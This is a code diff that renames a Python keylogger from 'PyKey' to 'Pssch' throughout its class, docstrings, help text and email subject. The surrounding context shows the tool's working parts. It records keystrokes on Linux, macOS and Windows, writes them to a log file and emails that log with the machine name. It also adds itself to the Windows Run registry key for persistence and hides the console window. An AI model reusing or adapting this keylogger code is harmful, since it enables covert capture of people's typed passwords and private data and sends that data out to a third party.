@@ -14,11 +14,11 @@ import datetime
 import os
 
 
-class PyKey:
+class Pssch:
     def __init__(self):
         """ Initialization method
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
         """
         self.EMAIL_FROM=''
         self.EMAIL_TO=''
@@ -43,7 +43,7 @@ class PyKey:
     def checkOS(self):
         """ Method to check the os where the script is running
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
         """
         os = platform.system()
         if os == 'Linux' or os == 'Windows':
@@ -55,7 +55,7 @@ class PyKey:
     def getKeyName(self, key):
         """ Method that returns the keyname
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
                 key (string): key pressed
         """
         if isinstance(key, keyboard.KeyCode):
@@ -67,7 +67,7 @@ class PyKey:
     def formatOutput(self):
         """ Method to format the key pressed and write it on a file
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
         """
         with open(self.LOG_FILE, 'r+') as f:
             data = f.read().replace('\n', '');
@@ -79,16 +79,16 @@ class PyKey:
     def sendEmail(self):
         """ Method that sends the log via email
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
         """
         now = datetime.datetime.now()
-        SUBJECT = 'PyKey - ' + str(now) + ' - ' + platform.node() + ' ' + platform.machine()
+        SUBJECT = 'Pssch - ' + str(now) + ' - ' + platform.node() + ' ' + platform.machine()
 
         with open(self.LOG_FILE, 'r') as myfile:
             data=myfile.read().replace('\n', '')
 
         TEXT = '''\
-        - PyKey - {now}.
+        - Pssch - {now}.
         - Date: {now}.
         - Machine: {machine}.
         - Data:
@@ -122,7 +122,7 @@ class PyKey:
     def onPress(self, key):
         """ Method that captures the key when the key press is down
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
                 key (string): key pressed
         """
         keyName = self.getKeyName(key)
@@ -141,7 +141,7 @@ class PyKey:
     def onRelease(self, key):
         """ Method that formats the key pressed when the key press is up
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
                 key (string): key pressed
         """
         keyName = self.getKeyName(key)
@@ -160,7 +160,7 @@ class PyKey:
     def record(self):
         """ Record strategy for OSX and Linux
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
         """
         with keyboard.Listener(
             on_press = self.onPress,
@@ -171,7 +171,7 @@ class PyKey:
     def onExit(self, output):
         """ Close the output stream
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
                 output: output stream
         """
         output.close()
@@ -180,7 +180,7 @@ class PyKey:
     def recordKeyWindows(self, output, is_down, event):
         """ Records the keys in Windows OS following a strategy depending on the operating system
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
                 output: output TEXT
                 is_down: catched key? Boolean
                 event: keyboard event Object
@@ -212,7 +212,7 @@ class PyKey:
         new_file_path = fp + "\\" + file_name
         keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
         key2change = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
-        SetValueEx(key2change, "PyKey Keylogger",0,REG_SZ, new_file_path)
+        SetValueEx(key2change, "Pssch Keylogger",0,REG_SZ, new_file_path)
 
     def hideWindowsConsole(self):
         import win32console, win32gui
@@ -225,7 +225,7 @@ class PyKey:
     def recordWindows(self):
         """ Records the keys in Windows OS following a strategy depending on the operating system
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
         """
         from functools import partial
         import atexit
@@ -251,7 +251,7 @@ class PyKey:
     def recordKeys(self):
         """ Records the keys following a strategy depending on the operating system
             Arguments:
-                self (PyKey): self instance
+                self (Pssch): self instance
         """
         if self.os == 'osx' or self.os == 'linux':
             self.record()
@@ -261,9 +261,9 @@ class PyKey:
     def help(self):
         help = '''\
 
-  PyKey v 1.0.0
+  Pssch v 1.0.0
   -------------
-    Usage: you need to edit the main file (pykey.py) and set the following properties:
+    Usage: you need to edit the main file (Pssch.py) and set the following properties:
            -> self.LOG_FILE: file path where to write the keyboard data
            -> self.EMAIL_FROM: (Optional) Email from to send the log data
            -> self.EMAIL_TO: (Optional) Email to to send the log data
@@ -271,7 +271,7 @@ class PyKey:
            -> self.GMAIL_PWD: (Optional) Gmail password to sned the emails
 
     Once you have configured the script, execute it with the following command
-        python pykey.py
+        python Pssch.py
 
 \
         '''
@@ -297,5 +297,5 @@ class PyKey:
 
 
 if __name__ == "__main__":
-    pyKey = PyKey()
-    pyKey.start()
+    Pssch = Pssch()
+    Pssch.start()
